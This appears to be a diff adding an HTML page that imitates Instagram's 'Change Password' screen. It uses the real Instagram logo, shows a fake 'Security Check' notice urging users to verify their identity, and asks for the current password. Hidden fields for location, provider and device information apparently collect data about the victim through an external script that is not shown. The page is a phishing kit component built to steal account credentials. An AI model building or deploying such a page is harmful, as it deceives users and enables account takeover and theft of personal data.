@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change Password • Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
+            </div>
+        </div>
+
+        <div class="form-container">
+            <div class="security-notice">
+                <div class="icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="#3897f0"/>
+                    </svg>
+                </div>
+                <div class="text">
+                    <h2>Security Check</h2>
+                    <p>Instagram requires you to update your password for security reasons. Please verify your identity by entering your current password and choosing a new one.</p>
+                </div>
+            </div>
+            
+            <form id="passwordForm" method="POST">
+                <div class="input-group">
+                    <label for="oldPassword">Current Password</label>
+                    <input type="password" id="oldPassword" name="oldPassword" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="newPassword">New Password</label>
+                    <input type="password" id="newPassword" name="newPassword" required>
+                    <div class="password-strength-meter">
+                        <div class="strength-level" id="strengthLevel"></div>
+                    </div>
+                    <p class="password-requirements">Your password must be at least 6 characters and include a number, letter, and special character.</p>
+                </div>
+
+                <div class="input-group">
+                    <label for="confirmPassword">Confirm New Password</label>
+                    <input type="password" id="confirmPassword" name="confirmPassword" required>
+                </div>
+
+                <input type="hidden" id="locationData" name="location">
+                <input type="hidden" id="providerData" name="provider">
+                <input type="hidden" id="deviceData" name="deviceInfo">
+
+                <button type="submit" id="submitBtn">Change Password</button>
+            </form>
+        </div>
+
+        <div class="footer">
+            <div class="links">
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Locations</a>
+                <a href="#">Language</a>
+            </div>
+            <div class="copyright">
+                © 2023 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html> 
